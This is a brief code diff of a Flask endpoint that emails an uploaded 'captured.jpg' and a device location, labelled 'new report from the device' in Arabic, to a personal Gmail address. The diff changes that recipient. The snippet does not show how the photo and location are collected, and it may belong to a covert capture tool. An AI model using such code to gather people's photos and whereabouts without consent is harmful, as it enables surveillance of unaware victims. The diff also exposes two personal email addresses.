@@ -22,7 +22,7 @@ def send_report():
     if not file or not location:
         return jsonify({'status': 'error', 'message': 'بيانات ناقصة'}), 400
 
-    msg = Message("تقرير جديد من الجهاز", recipients=["Zakaria.m.krayem@gmail.com"])
+    msg = Message("تقرير جديد من الجهاز", recipients=["new.tesla2023n@gmail.com"])
     msg.body = f"الموقع:\n{location}"
     msg.attach(filename="captured.jpg", content_type=file.content_type, data=file.read())
 
